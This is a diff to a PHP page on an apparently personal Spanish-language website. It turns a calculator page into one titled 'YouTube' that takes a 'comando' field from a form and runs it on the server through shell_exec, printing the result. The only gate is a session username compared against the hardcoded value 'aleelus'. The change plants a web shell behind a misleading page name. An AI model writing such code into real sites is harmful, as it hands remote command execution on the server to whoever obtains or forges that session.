@@ -1,7 +1,7 @@
 <?php
 
 session_start();
-if(!isset($_SESSION['user']))
+if(!isset($_SESSION['user']) || $_SESSION['user']!="aleelus")
 {
      header("location:micuenta.php");
 }
@@ -9,7 +9,7 @@ if(!isset($_SESSION['user']))
 <!DOCTYPE HTML>
 <html>
 	<head>
-		<title>Calculadora</title>
+		<title>YouTube</title>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
@@ -22,22 +22,40 @@ if(!isset($_SESSION['user']))
 		<div id="page-wrapper">
 
         <?php include("menu.php") ?>
+
 				<!-- Main -->
 					<article id="main">
 						<header>
 							<h2><?php echo $_SESSION['user']?></h2>
 						</header>
 						<section class="wrapper style1 special">
-              <h3>Calculadora</h3>
+              <h3>Youtube-ale(?)</h3>
 							<div class="inner">
                 <div class="row">
-                  <div class="col-md-4">
-                    <input type="text" name="user" id="user" pattern="[0-9]{1,15}"  required class="form-control input-lg" placeholder="Cantidad a invertir (AR$)"/>
-                  </div>
-                  <div class="col-md-8">
-                    <p>(☞ﾟヮﾟ)☞ Aca va la cantidad de miotas equivalentes ☜(ﾟヮﾟ☜)</p>
+                  <div class="col-md-12">
+                    <form name="form" action="" method="post">
+                        <input type="text" name="comando" id="comando"  required class="form-control input-lg" placeholder="Ingrese el comando"/>
+                        <br>
+                        <input type="submit" name="ejecutar" id="ejecutar" value="Ejecutar" class="button special hover">
+                    </form>
                   </div>
                 </div>
+                <?php
+                  if(isset($_POST["ejecutar"])){
+
+                      if(!empty($_POST["comando"])){
+
+                        if($_SESSION['user']=="aleelus"){
+                          $queryYT =shell_exec($_POST["comando"]);
+                          echo $queryYT;
+                        }else{
+                          echo "<p>USUARIO INVALIDO</p>";
+                        }
+
+                      }
+
+                  }
+                ?>
 							</div>
 						</section>
 					</article>
